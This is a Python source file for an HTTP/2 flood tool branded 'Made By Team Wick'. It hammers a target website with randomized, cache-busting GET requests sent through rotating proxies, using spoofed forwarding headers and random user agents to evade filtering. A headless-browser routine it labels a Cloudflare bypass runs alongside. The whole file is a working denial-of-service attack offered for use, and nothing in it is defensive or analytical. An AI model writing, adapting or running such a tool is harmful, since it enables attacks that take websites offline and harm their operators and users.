import asyncio
import httpx
import random
import string
import sys
import time
from playwright.async_api import async_playwright

logo = '''
    ______)              __       __)       
   (, /                 (, )  |  /  ,    /) 
     /   _  _  ___         | /| /     _ (/_ 
  ) /  _(/_(_(_// (_       |/ |/  _(_(__/(__
 (_/                       /  |             
                                            
       𝐌𝐚𝐝𝐞 𝐁𝐲 𝐓𝐞𝐚𝐦 𝐖𝐢𝐜𝐤
'''

print(logo)
# Function to generate a random string
def randstr(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Function to read proxies from a file
def read_proxies(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Function to create headers with bypass techniques
def generate_headers(target):
    return {
        ":method": "GET",
        ":authority": target,
        ":path": f"/?{randstr(5)}={randstr(25)}",
        ":scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "referer": f"https://{target}/?{randstr(15)}",
        "user-agent": randstr(15),
        "x-requested-with": "XMLHttpRequest",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1",
        "pragma": "no-cache",
        "x-forwarded-for": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "x-forwarded-proto": "https",
        "origin": f"https://{target}",
    }

# Attack function using httpx with bypasses
async def attack(target, proxy, rate, duration):
    timeout = httpx.Timeout(10.0, connect=5.0)
    async with httpx.AsyncClient(http2=True, proxies=f'http://{proxy}', timeout=timeout) as client:
        start_time = time.time()
        while time.time() - start_time < duration:
            tasks = []
            for _ in range(rate):
                headers = generate_headers(target)
                tasks.append(client.get(f"https://{target}/", headers=headers, follow_redirects=True))
            await asyncio.gather(*tasks, return_exceptions=True)

# Function to bypass Cloudflare using Playwright
async def bypass_cloudflare(target):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        await page.goto(f"https://{target}", wait_until="networkidle")
        await page.close()
        await browser.close()

# Main function to handle concurrency
async def main(target, duration, rate, threads, proxy_file):
    proxies = read_proxies(proxy_file)
    if not proxies:
        print("No proxies found!")
        return
    tasks = [bypass_cloudflare(target)]
    for _ in range(threads):
        proxy = random.choice(proxies)
        tasks.append(attack(target, proxy, rate, duration))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("Usage: python script.py <HOST> <TIME> <RPS> <THREADS> <PROXY FILE>")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2])
    rate = int(sys.argv[3])
    threads = int(sys.argv[4])
    proxy_file = sys.argv[5]
    
    asyncio.run(main(target, duration, rate, threads, proxy_file))
